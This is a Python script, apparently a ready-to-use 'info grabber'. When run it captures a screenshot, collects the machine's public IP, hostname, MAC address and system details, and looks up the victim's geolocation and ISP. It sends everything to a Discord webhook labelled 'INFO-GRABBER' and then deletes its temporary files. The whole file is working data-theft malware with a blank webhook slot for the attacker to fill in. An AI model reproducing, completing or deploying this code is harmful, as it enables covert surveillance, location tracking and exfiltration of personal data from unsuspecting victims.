from discord_webhook import DiscordWebhook, DiscordEmbed
import socket
import requests
import platform
import uuid
import os
import sys
import json
from PIL import ImageGrab
your_webhook_url = ''
your_webhook_nickname = ''
sending_method = 'file'# 
screenshot = ImageGrab.grab()
screenshot.save('97ufg98jeaef4.png')
ip = requests.get('https://checkip.amazonaws.com').text.strip()
hostname = socket.gethostname()
if sys.platform.startswith('win'):
    user_system = 'windows'
elif sys.platform.startswith('linux'):
    user_system = 'Linux'
else:
    user_system = 'other'
mac_int = uuid.getnode()
mac_str = ':'.join(['{:02x}'.format((mac_int >> i) & 0xff) for i in range(0,8*6,8)][::-1])
if sending_method == 'file':
    f = open("z3k1wm6pf37wash4.txt", "w")
    f.write('IP address: ')
    f.write(ip)
    f.write('\n')
    f.write('HOSTNAME: ')
    f.write(hostname)
    f.write('\n')
    f.write('MAC ADDRESS: ')
    f.write(mac_str)
    f.write('\n')
    f.write('OPERATING SYSTEM: ')
    f.write(user_system)
    f.write('\n')
    f.write('OPERATING SYSTEM VERSION: ')
    f.write(platform.release())
    f.write('\n')
    f.write('CPU ARCHITECTURE: ')
    f.write(platform.machine())
content = '@everyone'
webhook = DiscordWebhook(url=your_webhook_url, username="INFO-GRABBER", content=content)
if sending_method == 'file':
    with open("z3k1wm6pf37wash4.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename='z3k1wm6pf37wash4.txt')
if sending_method == 'embed':

    embed = DiscordEmbed(title='GRABBING STARTED', color=242424)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='IP address:', value=ip)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='HOSTNAME: ', value=hostname)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='MAC ADDRESS: ', value=mac_str)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='OPERATING SYSTEM: ', value=user_system)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='OPERATING SYSTEM VERSION: ', value=platform.release())
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='CPU ARCHITECTURE: ', value=platform.machine())
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='GRABBING ENDED', color=242424)
    webhook.add_embed(embed)
if sending_method == 'file':
    with open('97ufg98jeaef4.png', 'rb') as imagine:
        webhook.add_file(file=imagine.read(), filename='97ufg98jeaef4.png')
    os.remove("97ufg98jeaef4.png")

if sending_method == 'embed':
    with open('97ufg98jeaef4.png', 'rb') as imagine:
        webhook.add_file(file=imagine.read(), filename='97ufg98jeaef4.png')
    os.remove("97ufg98jeaef4.png")
if sending_method == 'file':
    os.remove("z3k1wm6pf37wash4.txt")
def get_ext_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]
get_ext_ip()
def get_ext_info():
    ip_address = get_ext_ip()
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    ext_info_grabbed = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name"),
        "latitude": response.get("latitude"),
        "longitude": response.get("longitude"),
        "timezone": response.get("timezone"),
        "country_calling_code": response.get("country_calling_code"),
        "currency": response.get("currency"),
        "currency_name": response.get("currency_name"),
        "ISP": response.get("org")
    }
    return ext_info_grabbed
get_ext_info()
ext_info_grabbed = get_ext_info()
with open('extendedinfotakethel.json', 'w') as owo:
    json.dump(ext_info_grabbed, owo)
with open("extendedinfotakethel.json", "rb") as uwu:
    webhook.add_file(file=uwu.read(), filename='extendedinfotakethel.json')
response = webhook.execute()
os.remove("extendedinfotakethel.json")
